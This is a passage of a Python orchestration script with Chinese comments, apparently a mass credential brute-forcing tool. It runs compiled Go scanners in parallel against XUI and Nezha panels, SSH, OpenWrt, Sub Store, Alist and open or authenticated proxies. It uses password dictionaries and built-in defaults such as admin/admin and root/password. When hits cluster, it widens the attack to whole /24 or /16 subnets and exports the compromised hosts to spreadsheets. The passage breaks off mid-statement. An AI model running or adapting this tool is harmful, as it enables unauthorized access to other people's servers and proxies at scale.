        for line_bytes in iter(process.stdout.readline, b''):
            line = line_bytes.decode('utf-8', 'ignore')
            # SSH模式的特殊日志，直接打印
            if "Scanning SSH:" in line:
                # 使用 \r 和 end='' 来实现单行刷新，避免刷屏
                print(line.strip().ljust(80), end='\r')
        
        # 等待进程结束并获取返回码
        process.wait()
        
        if process.returncode != 0:
            if process.returncode == -9 or process.returncode == 137:
                 return (False, "任务 {} 被系统因内存不足而终止(OOM Killed)。".format(chunk_id))
            else:
                 # 读取残余的错误信息（如果有）
                 stderr_output = process.stdout.read().decode('utf-8', 'ignore')
                 return (False, "任务 {} 失败，返回码 {}。\n错误信息:\n{}".format(chunk_id, process.returncode, stderr_output))
        
        return (True, None) # 成功
    finally:
        # 清理临时文件
        if os.path.exists(input_file):
            os.remove(input_file)
        # 输出文件保留，最后合并

def run_scan_in_parallel(lines, executable_name, python_concurrency, go_internal_concurrency, chunk_size):
    """
    使用Python线程池并发执行多个小的Go进程来完成扫描。
    """
    # 将所有IP分成小块
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    
    print("ℹ️  [扫描] 已将 {} 个目标分为 {} 个小任务块。".format(len(lines), len(chunks)))
    
    with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
        # 提交所有任务
        future_to_chunk_id = {executor.submit(process_chunk, i, chunk, executable_name, go_internal_concurrency): i for i, chunk in enumerate(chunks)}
        
        # 使用tqdm显示总体进度
        with tqdm(total=len(chunks), desc="⚙️  [扫描] 处理任务块", ncols=100) as pbar:
            for future in as_completed(future_to_chunk_id):
                chunk_id = future_to_chunk_id[future]
                try:
                    success, error_message = future.result()
                    if not success:
                        # 清除可能残留的单行日志
                        print(" " * 80, end='\r')
                        print("\n❌ {}".format(error_message))
                        # 如果发生OOM，最好停止所有任务
                        if "OOM" in error_message:
                            print(" detecting OOM error, stopping all tasks...")
                            executor.shutdown(wait=False, cancel_futures=True)
                            raise SystemExit("内存不足，脚本已中止。请使用更低的并发数重试。")
                except Exception as exc:
                    print('\n任务 {} 执行时产生异常: {}'.format(chunk_id, exc))
                
                pbar.update(1)
    # 扫描结束后，打印一个换行符以清除最后的单行日志
    print("\n")


# =======================================================

def merge_xui_files():
    merged_file = 'xui.txt' 
    if os.path.exists(merged_file):
        os.remove(merged_file)

    with open(merged_file, 'w', encoding='utf-8') as outfile:
        # 注意：现在输出文件名是 output_*.txt
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("output_") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                    shutil.copyfileobj(infile, outfile)

def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = output_name 
    if os.path.exists(output_path):
        os.remove(output_path)
    
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
    if not files_to_merge:
        return

    with open(output_path, "w", encoding="utf-8") as out:
        for f_path in files_to_merge:
            with open(f_path, "r", encoding="utf-8") as f:
                shutil.copyfileobj(f, out)


def run_ipcx(final_result_file, xlsx_output_file):
    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
        print("\n📊 [报告] 正在查询IP地理位置并生成Excel报告...")
        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])

def clean_temp_files(template_mode):
    print("🗑️  [清理] 正在删除临时文件...")
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    if template_mode == 6: # 仅在SSH模式下清理
        shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
        shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)

    # 增加清理新的go文件和可执行文件
    for f in ['xui.go', 'subnet_scanner.go', 'ipcx.py', 'go.mod', 'go.sum', 
              'xui_executable', 'xui_executable.exe',
              'subnet_scanner_executable', 'subnet_scanner_executable.exe']: 
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass
    print("✅ [清理] 清理完成。")


def choose_template_mode():
    print("请选择爆破模式：")
    print("1. XUI面板")
    print("2. 哪吒面板")
    print("3. SSH")
    print("4. Sub Store")
    print("5. OpenWrt/iStoreOS")
    print("--- 代理模式 ---")
    print("6. SOCKS5 代理")
    print("7. HTTP 代理")
    print("8. HTTPS 代理")
    print("--- 其他面板 ---")
    print("9. Alist 面板")
    print("10. TCP 端口活性检测")
    while True:
        choice = input("输入 1-10 之间的数字 (默认: 1)：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2
        elif choice == "3": return 6
        elif choice == "4": return 7
        elif choice == "5": return 8
        elif choice == "6": return 9   # SOCKS5
        elif choice == "7": return 10  # HTTP
        elif choice == "8": return 11  # HTTPS
        elif choice == "9": return 12  # Alist
        elif choice == "10": return 13 # TCP Test
        else:
            print("❌ 输入无效，请重新输入。")

def select_proxy_test_target():
    print("\n--- 代理测试目标选择 ---")
    print("1: IPIP.net (IP验证, 推荐)")
    print("2: Google (全球, http)")
    print("3: Xiaomi (中国大陆稳定, http)")
    print("4: Baidu (中国大陆稳定, https)")
    print("5: 自定义URL")
    
    default_target = "http://myip.ipip.net"
    
    while True:
        choice_str = input("请选择一个测试目标 (默认: 1): ").strip()
        if choice_str == "" or choice_str == "1":
            return default_target
        
        try:
            choice = int(choice_str)
            if choice == 2:
                return "http://www.google.com/generate_204"
            elif choice == 3:
                return "http://connect.rom.miui.com/generate_204"
            elif choice == 4:
                return "https://www.baidu.com"
            elif choice == 5:
                custom_url = input("请输入自定义测试URL: ").strip()
                if custom_url:
                    return custom_url
                else:
                    print("⚠️  输入为空，使用默认目标。")
                    return default_target
            else:
                print("⚠️  无效选择，请重新输入。")
        except ValueError:
            print("⚠️  无效输入，请输入数字。")

def get_default_interface():
    """自动检测默认的网络接口"""
    try:
        result = subprocess.check_output(["ip", "route", "get", "8.8.8.8"], text=True)
        match = re.search(r'dev\s+(\S+)', result)
        if match:
            return match.group(1)
    except Exception:
        try:
            with open('/proc/net/route') as f:
                for line in f:
                    fields = line.strip().split()
                    if fields[1] == '00000000' and int(fields[3], 16) & 2:
                        return fields[0]
        except Exception:
            return None
    return None

def is_in_china():
    print("    - 正在通过 ping google.com 检测网络环境...")
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "2", "google.com"],
            capture_output=True, check=False 
        )
        if result.returncode == 0:
            print("    - 🌍 Ping 成功，判断为海外服务器。")
            return False
        else:
            print("    - 🇨🇳 Ping 超时或失败，判断为国内服务器，将自动使用镜像。")
            return True
    except FileNotFoundError:
        print("    - ⚠️  未找到 ping 命令，无法检测网络。将使用默认源。")
        return False
    except Exception as e:
        print(f"    - ⚠️  Ping 检测时发生未知错误: {e}，将使用默认源。")
        return False

def check_environment(template_mode, is_china_env):
    import platform
    
    def run_cmd(cmd, check=True, quiet=False, extra_env=None):
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        
        stdout = subprocess.DEVNULL if quiet else None
        stderr = subprocess.DEVNULL if quiet else None
        try:
            subprocess.run(cmd, check=check, stdout=stdout, stderr=stderr, env=env)
        except subprocess.CalledProcessError as e:
            if check: raise e
        except FileNotFoundError:
            print("❌ 命令未找到: {}。请确保该命令在您的系统PATH中。".format(cmd[0]))
            raise

    if platform.system().lower() == "windows":
        print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\n")
        return

    print(">>> 正在检查并安装依赖环境...")
    
    pkg_manager = ""
    if shutil.which("apt-get"):
        pkg_manager = "apt-get"
    elif shutil.which("yum"):
        pkg_manager = "yum"
    else:
        print("❌ 无法检测到 apt-get 或 yum。此脚本仅支持 Debian/Ubuntu 和 CentOS/RHEL 系列系统。")
        sys.exit(1)

    print("    - 检测到包管理器: {}".format(pkg_manager))
    
    UPDATED = False
    def ensure_packages(pm, packages):
        nonlocal UPDATED
        sys.stdout.write("    - 正在使用 {} 检查系统包...".format(pm))
        sys.stdout.flush()
        try:
            if not UPDATED and pm == "apt-get":
                run_cmd([pm, "update", "-y"], quiet=True)
                UPDATED = True
            
            install_cmd = [pm, "install", "-y"] + packages
            run_cmd(install_cmd, quiet=True)
            print(" ✅")
        except Exception as e:
            print(" ❌ 失败: {}".format(e))
            sys.exit(1)

    ping_package = "iputils-ping" if pkg_manager == "apt-get" else "iputils"
    iproute_package = "iproute2" if pkg_manager == "apt-get" else "iproute"
    
    ensure_packages(pkg_manager, ["curl", ping_package, iproute_package, "nmap", "masscan"])
        
    # 智能依赖安装
    required_py_modules = ['requests', 'psutil', 'openpyxl', 'pyyaml', 'tqdm', 'colorama']
    missing_modules = []
    for module in required_py_modules:
        # 修复: 使用 importlib.util.find_spec 替代 __import__
        if importlib.util.find_spec(module) is None:
            missing_modules.append(module)

    if missing_modules:
        print(f"    - 检测到缺失的 Python 模块: {', '.join(missing_modules)}")
        sys.stdout.write("    - 正在尝试使用 pip 自动安装...")
        sys.stdout.flush()
        try:
            pip_help_output = subprocess.check_output([sys.executable, "-m", "pip", "install", "--help"], text=True, stderr=subprocess.DEVNULL)
            use_break_system_packages = "--break-system-packages" in pip_help_output

            pip_cmd = [sys.executable, "-m", "pip", "install"]
            if is_china_env:
                pip_cmd.extend(["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"])
            
            if use_break_system_packages:
                pip_cmd.append("--break-system-packages")

            pip_cmd.extend(missing_modules)
            run_cmd(pip_cmd, quiet=True)
            print(" ✅")
        except Exception as e:
            print(" ❌ 失败: {}".format(e))
            print("❌ 自动安装失败。请手动运行以下命令解决依赖问题后重试:")
            manual_cmd = "{} -m pip install {}".format(sys.executable, " ".join(missing_modules))
            if use_break_system_packages:
                 manual_cmd += " --break-system-packages"
            if is_china_env:
                manual_cmd += " -i https://pypi.tuna.tsinghua.edu.cn/simple"
            print(manual_cmd)
            sys.exit(1)

    ensure_packages(pkg_manager, ["ca-certificates", "tar"])

    if pkg_manager == "apt-get":
        sys.stdout.write("    - 正在更新CA证书...")
        sys.stdout.flush()
        run_cmd(["update-ca-certificates"], quiet=True)
        print(" ✅")

    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except:
            return None

    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- Go环境不满足，正在自动安装... ---")
        if pkg_manager == "apt-get":
            run_cmd(["apt-get", "remove", "-y", "golang-go"], check=False, quiet=True) 
            run_cmd(["apt-get", "autoremove", "-y"], check=False, quiet=True)
        else: # yum
             run_cmd(["yum", "remove", "-y", "golang"], check=False, quiet=True)

        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        if not is_china_env:
            urls.reverse()

        GO_TAR_PATH = "/tmp/go.tar.gz"
        download_success = False
        for url in urls:
            print("    - 正在从 {} 下载Go...".format(url.split('/')[2]))
            try:
                subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True)
                download_success = True
                break
            except Exception:
                print("      下载失败，尝试下一个源...")
        
        if not download_success:
            print("❌ Go安装包下载失败，请检查网络。")
            sys.exit(1)

        sys.stdout.write("    - 正在解压Go安装包...")
        sys.stdout.flush()
        try:
            run_cmd(["rm", "-rf", "/usr/local/go"], quiet=True)
            run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True)
            print(" ✅")
        except Exception as e:
            print(" ❌ 失败: {}".format(e))
            sys.exit(1)

        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    if is_china_env:
        go_env['GOPROXY'] = 'https://goproxy.cn,direct'

    if not os.path.exists("go.mod"):
        run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)

    required_pkgs = []
    if template_mode == 6: # SSH
        required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]: # 代理模式
        required_pkgs.append("golang.org/x/net/proxy")

    if required_pkgs:
        sys.stdout.write("    - 正在安装Go模块...")
        sys.stdout.flush()
        for pkg in required_pkgs:
            try:
                run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
            except subprocess.CalledProcessError as e:
                print("\n❌ Go模块 '{}' 安装失败。请检查网络或代理设置。".format(pkg))
                raise e 
        print(" ✅")

    print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")

def load_credentials(template_mode, auth_mode=0):
    usernames, passwords, credentials = [], [], []
    
    if template_mode == 7: # Sub Store 模式
        usernames, passwords = ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"]
        return usernames, passwords, credentials
    
    if template_mode in [12, 13]: # Alist 和 TCP Test 模式不需要凭据
        return [], [], []

    if auth_mode == 1: # 无凭据
        return [], [], []
    
    if auth_mode == 2: # 用户/密码文件
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
            sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        if template_mode == 2:
            print("ℹ️  检测到哪吒面板模式，将自动过滤长度小于8的密码...")
            original_pass_count = len(passwords)
            passwords = [p for p in passwords if len(p) >= 8 or p == 'admin']
            print(f"  - 过滤完成，保留了 {len(passwords)}/{original_pass_count} 个密码。")
            if not passwords:
                print("❌ 错误: 过滤后，密码字典中没有剩余的有效密码。")
                print("   哪吒面板要求密码至少为8个字符（默认密码'admin'除外），无法继续扫描。")
                sys.exit(1)

        if not usernames or not passwords:
            print("❌ 错误: 用户名或密码文件为空。")
            sys.exit(1)
        return usernames, passwords, credentials

    if auth_mode == 3: # 凭据文件
        if not os.path.exists("credentials.txt"):
            print("❌ 错误: 缺少 credentials.txt 文件。")
            sys.exit(1)
        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials:
            print("❌ 错误: credentials.txt 文件为空或格式不正确。")
            sys.exit(1)
        return usernames, passwords, credentials

    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
    if use_custom == 'y':
        return load_credentials(template_mode, auth_mode=2)
    else:
        if template_mode == 8: usernames, passwords = ["root"], ["password"]
        else: usernames, passwords = ["admin"], ["admin"]
        return usernames, passwords, credentials


def get_vps_info():
    import requests
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
        response.raise_for_status()
        data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException as e:
        print("⚠️  获取VPS信息失败: {}".format(e))
    return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file):
        return "N/A"
    try:
        import yaml
        with open(config_file, 'r', encoding='utf-8') as f:
            config_data = yaml.safe_load(f)
            if isinstance(config_data, dict) and 'server' in config_data:
                return config_data['server']
    except Exception as e:
        print("⚠️  解析 {} 失败: {}".format(config_file, e))
    return "N/A"

def parse_result_line(line):
    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
    if proxy_match:
        user, password, ip, port = proxy_match.group(2) or '', proxy_match.group(3) or '', proxy_match.group(4), proxy_match.group(5)
        return ip, port, user, password

    parts = line.split()
    if len(parts) >= 1:
        ip_port = parts[0]
        user = parts[1] if len(parts) > 1 else ''
        password = parts[2] if len(parts) > 2 else ''
        if ':' in ip_port:
            ip, port = ip_port.split(':', 1)
            return ip, port, user, password
            
    return None, None, None, None

def expand_scan_with_go(result_file, main_brute_executable, subnet_scanner_executable, subnet_size, go_concurrency, params):
    if not os.path.exists(result_file) or os.path.getsize(result_file) == 0:
        return set()

    print("\n🔍 [扩展] 正在分析结果以寻找可扩展的IP网段...")
    with open(result_file, 'r', encoding='utf-8') as f:
        master_results = {line.strip() for line in f}
    
    ips_to_analyze = master_results
    
    for i in range(2): # 执行两轮扩展
        print(f"\n--- [扩展扫描 第 {i + 1}/2 轮] ---")
        
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, password = parse_result_line(line)
            if not ip: continue
            
            # 根据用户选择的子网大小进行分组
            ip_parts = ip.split('.')
            if subnet_size == 16:
                subnet_prefix = ".".join(ip_parts[:2])
            else: # 默认 /24
                subnet_prefix = ".".join(ip_parts[:3])
            
            key = (subnet_prefix, port, user, password)
            
            if key not in groups: groups[key] = set()
            groups[key].add(ip)

        expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]

        if not expandable_targets:
            print(f"  - 第 {i + 1} 轮未找到符合条件的IP集群，扩展扫描结束。")
            break

        print(f"  - 第 {i + 1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群。")
        
        newly_verified_this_round = set()

        for subnet_prefix, port, user, password in expandable_targets:
            cidr = f"{subnet_prefix}.0.0/{subnet_size}" if subnet_size == 16 else f"{subnet_prefix}.0/{subnet_size}"
            print(f"\n  --- [扫描集群] 目标: {cidr} 端口: {port} ---")
            
            # 1. 使用Go TCP扫描器寻找活性主机
            subnet_scan_output = "subnet_scan_output.tmp"
            if os.path.exists(subnet_scan_output): os.remove(subnet_scan_output)
            
            try:
                cmd = ['./' + subnet_scanner_executable, cidr, port, subnet_scan_output, str(go_concurrency * 2)]
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            except Exception as e:
                print(f"    - ❌ 子网TCP扫描失败: {e}")
                continue

            if not os.path.exists(subnet_scan_output) or os.path.getsize(subnet_scan_output) == 0:
                print("    - TCP扫描未发现新的活性主机。")
                continue
            
            with open(subnet_scan_output, 'r') as f:
                all_live_ips_str = {line.strip().split(':')[0] for line in f if line.strip()}

            # 从已知结果中过滤，避免重复验证
            ips_to_verify = {f"{ip}:{port}" for ip in all_live_ips_str} - {f"{l.split()[0]}" for l in master_results}

            if not ips_to_verify:
                print(f"    - TCP扫描发现 {len(all_live_ips_str)} 个活性主机，但均为已知结果。")
                continue

            print(f"    - TCP扫描发现 {len(ips_to_verify)} 个新的活性目标，正在进行二次验证...")

            # 2. 使用主爆破程序对活性主机进行验证
            verification_input_file = "verification_input.tmp"
            with open(verification_input_file, 'w') as f:
                for ip_port in ips_to_verify:
                    f.write(f"{ip_port}\n")

            try:
                verification_output_file = "verification_output.tmp"
                if os.path.exists(verification_output_file): os.remove(verification_output_file)

                # 使用找到的特定用户名和密码进行验证
                run_env = os.environ.copy()
                run_env["GOGC"] = "50"
                cmd = ['./' + main_brute_executable, verification_input_file, verification_output_file]
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=run_env)
                
                if os.path.exists(verification_output_file):
                    with open(verification_output_file, 'r') as f:
                        new_finds = {line.strip() for line in f}
                        print(f"    - ✅ 二次验证成功 {len(new_finds)} 个新目标。")
                        newly_verified_this_round.update(new_finds)
                    os.remove(verification_output_file)
            except Exception as e:
                print(f"    - ❌ 二次验证时发生未知错误: {e}")
            
            if os.path.exists(verification_input_file): os.remove(verification_input_file)
            if os.path.exists(subnet_scan_output): os.remove(subnet_scan_output)

        new_ips_this_round = newly_verified_this_round - master_results
        if not new_ips_this_round:
            print(f"--- 第 {i + 1} 轮未发现任何全新的IP，扩展扫描结束。 ---")
            break
        
        master_results.update(new_ips_this_round)
        ips_to_analyze = new_ips_this_round

    with open(result_file, 'r', encoding='utf-8') as f:
        initial_set = {line.strip() for line in f}
    return master_results - initial_set

def run_go_tcp_prescan(source_lines, go_concurrency, timeout):
    print("\n--- 正在执行 Go TCP 预扫描以筛选活性IP... ---")

    # 1. 编译专用的TCP测试程序
    generate_go_code("tcp_prescan.go", TCP_PRESCAN_GO_TEMPLATE_LINES, semaphore_size=go_concurrency, timeout=timeout)
    executable = compile_go_program("tcp_prescan.go", "tcp_prescan_executable")
    if not executable:
        print("  - ❌ TCP预扫描程序编译失败，跳过预扫描。")
        return source_lines

    # 2. 运行扫描
    input_file = "prescan_input.tmp"
    output_file = "prescan_output.tmp"
    if os.path.exists(output_file): os.remove(output_file)

    with open(input_file, 'w', encoding='utf-8') as f:
        f.write("\n".join(source_lines))
    
    live_targets = []
    try:
        cmd = ['./' + executable, input_file]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='ignore')
        
        with tqdm(total=len(source_lines), desc="[⚡] TCP活性检测", ncols=100) as pbar:
            for line in process.stdout:
                pbar.update(1)
                if line.startswith("SUCCESS:"):
                    target = line.strip().split(':', 1)[1]
                    live_targets.append(target)
        
        stderr_output = process.communicate()[1]
        if process.returncode != 0:
            print(f"\n  - ⚠️  Go TCP扫描进程返回非零代码: {process.returncode}")
            if stderr_output:
                print(f"  - 错误信息: {stderr_output}")

    except Exception as e:
        print(f"  - ❌ Go TCP预扫描执行失败: {e}，跳过预扫描。")
        return source_lines
    finally:
        # 3. 清理
        if os.path.exists(input_file): os.remove(input_file)
        if os.path.exists(output_file): os.remove(output_file)
        if os.path.exists("tcp_prescan.go"): os.remove("tcp_prescan.go")
        if os.path.exists(executable): os.remove(executable)
    
    print(f"--- ✅ Go TCP 预扫描完成。筛选出 {len(live_targets)} 个活性目标。---")
    return live_targets


if __name__ == "__main__":
    start = time.time()
    interrupted = False
    final_result_file = None
    total_ips = 0 
    
    TEMP_PART_DIR = "temp_parts"
    TEMP_XUI_DIR = "xui_outputs"
    TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
    TEMP_HMFAIL_DIR = "temp_hmfail"

    from datetime import datetime, timedelta, timezone
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M")
    
    TEMPLATE_MODE = choose_template_mode()
    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist", 13: "TCP-Active"}
    prefix = mode_map.get(TEMPLATE_MODE, "result")
    is_china_env = is_in_china()

    try:
        print("\n🚀 === 爆破一键启动 - 参数配置 === 🚀")
        
        use_go_prescan = False
        if TEMPLATE_MODE != 13:
            prescan_choice = input("是否启用 Go TCP 预扫描以筛选活性IP？(y/N): ").strip().lower()
            if prescan_choice == 'y':
                use_go_prescan = True

        input_file = input_filename_with_default("📝 请输入源文件名", "1.txt")
        if not os.path.exists(input_file):
                print(f"❌ 错误: 文件 '{input_file}' 不存在。")
                sys.exit(1)

        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]
            total_ips = len(all_lines)
        print(f"--- 📝 总计 {total_ips} 个目标 ---")
        
        total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
        try:
            cpu_cores = os.cpu_count() or 1
        except NotImplementedError:
            cpu_cores = 2

        if total_memory_mb < 1500:
            print(f"⚠️  检测到系统内存较低 ({total_memory_mb:.2f} MiB)，建议使用保守的并发数。")
            recommended_py_concurrency = max(1, cpu_cores)
            recommended_go_concurrency = 20
        else:
            recommended_py_concurrency = cpu_cores * 2
            recommended_go_concurrency = 100
        
        # 预扫描逻辑
        if use_go_prescan:
            all_lines = run_go_tcp_prescan(all_lines, recommended_go_concurrency * 2, 3)
            total_ips = len(all_lines)
            if not all_lines:
                print("预扫描后没有发现活性目标，脚本结束。")
                sys.exit(0)
        
        # 子网扩展扫描配置
        use_expand_scan = False
        subnet_expansion_size = 24
        expand_choice = input("是否在扫描结束后启用子网扩展扫描? (y/N): ").strip().lower()
        if expand_choice == 'y':
            use_expand_scan = True
            size_choice = input("请选择子网扩展范围 (1: /24 (C段), 2: /16 (B段), 默认 1): ").strip()
            if size_choice == '2':
                subnet_expansion_size = 16
            print(f"  - 已选择 /{subnet_expansion_size} 范围进行扩展。")

        print("\n--- ⚙️  并发模型说明 ---")
        print("脚本将启动多个并行的扫描进程（由Python控制），每个进程内部再使用多个线程（由Go控制）进行扫描。")
        print("对于内存较小的设备，请保持“Python并发任务数”为一个较低的数值。")

        python_concurrency = input_with_default("请输入Python并发任务数", recommended_py_concurrency)
        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数", recommended_go_concurrency)
        chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)

        params = {'semaphore_size': go_internal_concurrency}
        params['timeout'] = input_with_default("超时时间(秒)", 3)
        
        params['test_url'] = "http://myip.ipip.net"
        if TEMPLATE_MODE in [9, 10, 11]:
            params['test_url'] = select_proxy_test_target()
            if TEMPLATE_MODE == 11 and not params['test_url'].startswith("https://"):
                print("\n⚠️  [警告] 您正在使用HTTP测试目标来测试HTTPS代理。")
                print("   这很可能会失败，建议选择一个HTTPS测试目标(例如Baidu)。")

        nezha_analysis_threads = 0
        if TEMPLATE_MODE == 2:
            nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)

        AUTH_MODE = 0
        if TEMPLATE_MODE in [9, 10, 11]:
            print("\n请选择代理凭据模式：")
            print("1. 无凭据 (扫描开放代理)")
            print("2. 独立字典 (使用 username.txt 和 password.txt)")
            print("3. 组合凭据 (使用 credentials.txt, 格式 user:pass)")
            while True:
                auth_choice = input("输入 1, 2, 或 3 (默认: 1): ").strip()
                if auth_choice in ["", "1"]: AUTH_MODE = 1; break
                elif auth_choice == "2": AUTH_MODE = 2; break
                elif auth_choice == "3": AUTH_MODE = 3; break
                else: print("❌ 输入无效。")
            
            if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"
            elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
            elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"

        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
        params['auth_mode'] = AUTH_MODE
        
        check_environment(TEMPLATE_MODE, is_china_env)
        
        import psutil, requests, yaml
        from openpyxl import Workbook, load_workbook
        from tqdm import tqdm

        adjust_oom_score()
        check_and_manage_swap()

        os.makedirs(TEMP_PART_DIR, exist_ok=True)
        os.makedirs(TEMP_XUI_DIR, exist_ok=True)
        if TEMPLATE_MODE == 6:
            os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
            os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)

        template_map = {
            1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES,
            6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
            8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES,
            10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES,
            12: ALIST_GO_TEMPLATE_LINES, 13: TCP_ACTIVE_GO_TEMPLATE_LINES,
        }

        template_lines = template_map[TEMPLATE_MODE]
        generate_go_code("xui.go", template_lines, **params)
        
        executable = compile_go_program("xui.go", "xui_executable")
        if not executable: sys.exit(1)
        
        generate_ipcx_py()
        run_scan_in_parallel(all_lines, executable, python_concurrency, go_internal_concurrency, chunk_size)
        
        merge_xui_files()
        
        initial_results_file = "xui.txt"
        if use_expand_scan and os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
            generate_go_code("subnet_scanner.go", SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES)
            subnet_scanner_exec = compile_go_program("subnet_scanner.go", "subnet_scanner_executable")
            if subnet_scanner_exec:
                newly_found_results = expand_scan_with_go(initial_results_file, executable, subnet_scanner_exec, subnet_expansion_size, go_internal_concurrency, params)
                if newly_found_results:
                    print(f"--- [扩展] 扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
                    with open(initial_results_file, 'a', encoding='utf-8') as f:
                        for result in sorted(list(newly_found_results)):
                            f.write(result + '\n')
                    
                    with open(initial_results_file, 'r', encoding='utf-8') as f:
                        unique_lines = sorted(list(set(f.readlines())))
                    with open(initial_results_file, 'w', encoding='utf-8') as f:
                        f.writelines(unique_lines)
                    print("--- [扩展] 结果合并去重完成。 ---")
        
        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
        
        if os.path.exists("xui.txt"):
            os.rename("xui.txt", final_txt_file)
            run_ipcx(final_txt_file, final_xlsx_file)

        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            analysis_threads = nezha_analysis_threads
            print(f"\n--- 🔍 [分析] 开始对成功的哪吒面板进行深度分析 (使用 {analysis_threads} 线程)... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f:
                results = [line.strip() for line in f if line.strip()]
            
            nezha_analysis_data = {}
            with ThreadPoolExecutor(max_workers=analysis_threads) as executor:
                future_to_result = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(future_to_result), total=len(results), desc="[🔍] 分析哪吒面板"):
                    result_line = future_to_result[future]
                    try:
                        returned_line, analysis_result = future.result()
                        nezha_analysis_data[returned_line] = analysis_result
                    except Exception as exc:
                        print(f'{result_line} 生成了一个异常: {exc}')
                        nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")
            if nezha_analysis_data:
                update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
        
    except KeyboardInterrupt:
